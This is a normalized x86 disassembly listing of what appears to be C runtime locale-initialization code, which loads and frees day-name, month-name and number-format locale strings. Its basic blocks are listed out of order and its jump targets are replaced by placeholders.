sub_432552
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4324ca
add esp 0x1c
pop ebp
retn
sub_432575
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_438b0f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_4296a0
sub_43259d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_42ae11
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_42ae11
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_42ae11
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_42ae11
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_432d9c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_42578a
push [ esi + 0x8 ]
call sub_42578a
push [ esi + 0xc ]
call sub_42578a
push [ esi + 0x10 ]
call sub_42578a
push [ esi + 0x14 ]
call sub_42578a
push [ esi + 0x18 ]
call sub_42578a
push [ esi ]
call sub_42578a
push [ esi + 0x20 ]
call sub_42578a
push [ esi + 0x24 ]
call sub_42578a
push [ esi + 0x28 ]
call sub_42578a
push [ esi + 0x2c ]
call sub_42578a
push [ esi + 0x30 ]
call sub_42578a
push [ esi + 0x34 ]
call sub_42578a
push [ esi + 0x1c ]
call sub_42578a
push [ esi + 0x38 ]
call sub_42578a
push [ esi + 0x3c ]
call sub_42578a
add esp 0x40
push [ esi + 0x40 ]
call sub_42578a
push [ esi + 0x44 ]
call sub_42578a
push [ esi + 0x48 ]
call sub_42578a
push [ esi + 0x4c ]
call sub_42578a
push [ esi + 0x50 ]
call sub_42578a
push [ esi + 0x54 ]
call sub_42578a
push [ esi + 0x58 ]
call sub_42578a
push [ esi + 0x5c ]
call sub_42578a
push [ esi + 0x60 ]
call sub_42578a
push [ esi + 0x64 ]
call sub_42578a
push [ esi + 0x68 ]
call sub_42578a
push [ esi + 0x6c ]
call sub_42578a
push [ esi + 0x70 ]
call sub_42578a
push [ esi + 0x74 ]
call sub_42578a
push [ esi + 0x78 ]
call sub_42578a
push [ esi + 0x7c ]
call sub_42578a
add esp 0x40
push [ esi + 0x80 ]
call sub_42578a
push [ esi + 0x84 ]
call sub_42578a
push [ esi + 0x88 ]
call sub_42578a
push [ esi + 0x8c ]
call sub_42578a
push [ esi + 0x90 ]
call sub_42578a
push [ esi + 0x94 ]
call sub_42578a
push [ esi + 0x98 ]
call sub_42578a
push [ esi + 0x9c ]
call sub_42578a
push [ esi + 0xa0 ]
call sub_42578a
push [ esi + 0xa4 ]
call sub_42578a
push [ esi + 0xa8 ]
call sub_42578a
push [ esi + 0xbc ]
call sub_42578a
push [ esi + 0xc0 ]
call sub_42578a
push [ esi + 0xc4 ]
call sub_42578a
push [ esi + 0xc8 ]
call sub_42578a
push [ esi + 0xcc ]
call sub_42578a
add esp 0x40
push [ esi + 0xd0 ]
call sub_42578a
push [ esi + 0xb8 ]
call sub_42578a
push [ esi + 0xd8 ]
call sub_42578a
push [ esi + 0xdc ]
call sub_42578a
push [ esi + 0xe0 ]
call sub_42578a
push [ esi + 0xe4 ]
call sub_42578a
push [ esi + 0xe8 ]
call sub_42578a
push [ esi + 0xec ]
call sub_42578a
push [ esi + 0xd4 ]
call sub_42578a
push [ esi + 0xf0 ]
call sub_42578a
push [ esi + 0xf4 ]
call sub_42578a
push [ esi + 0xf8 ]
call sub_42578a
push [ esi + 0xfc ]
call sub_42578a
push [ esi + 0x100 ]
call sub_42578a
push [ esi + 0x104 ]
call sub_42578a
push [ esi + 0x108 ]
call sub_42578a
add esp 0x40
push [ esi + 0x10c ]
call sub_42578a
push [ esi + 0x110 ]
call sub_42578a
push [ esi + 0x114 ]
call sub_42578a
push [ esi + 0x118 ]
call sub_42578a
push [ esi + 0x11c ]
call sub_42578a
push [ esi + 0x120 ]
call sub_42578a
push [ esi + 0x124 ]
call sub_42578a
push [ esi + 0x128 ]
call sub_42578a
push [ esi + 0x12c ]
call sub_42578a
push [ esi + 0x130 ]
call sub_42578a
push [ esi + 0x134 ]
call sub_42578a
push [ esi + 0x138 ]
call sub_42578a
push [ esi + 0x13c ]
call sub_42578a
push [ esi + 0x140 ]
call sub_42578a
push [ esi + 0x144 ]
call sub_42578a
push [ esi + 0x148 ]
call sub_42578a
add esp 0x40
push [ esi + 0x14c ]
call sub_42578a
push [ esi + 0x150 ]
call sub_42578a
push [ esi + 0x154 ]
call sub_42578a
push [ esi + 0x158 ]
call sub_42578a
push [ esi + 0x15c ]
call sub_42578a
push [ esi + 0x160 ]
call sub_42578a
add esp 0x18
sub_433113
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_42acf2
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_43259d
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_432d9c
push edi
call sub_42578a
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_433190
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
mov bl [ eax + 0x1 ]
mov [ eax ] bl
inc eax
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_4331c0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
push esi
call sub_42578a
pop ecx
sub_433229
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_42acf2
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_42acad
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_42578a
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_42acad
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_42ae11
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_4331c0
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_42578a
push [ esi + 0xbc ]
call sub_42578a
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_42578a
push [ ebp - 0x8 ]
call sub_42578a
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_433419
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
mov bl [ eax + 0x1 ]
mov [ eax ] bl
inc eax
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_433449
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_42578a
pop ecx
push esi
call sub_42578a
pop ecx
sub_433547
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_42acf2
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_42acad
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_42578a
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_42acad
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
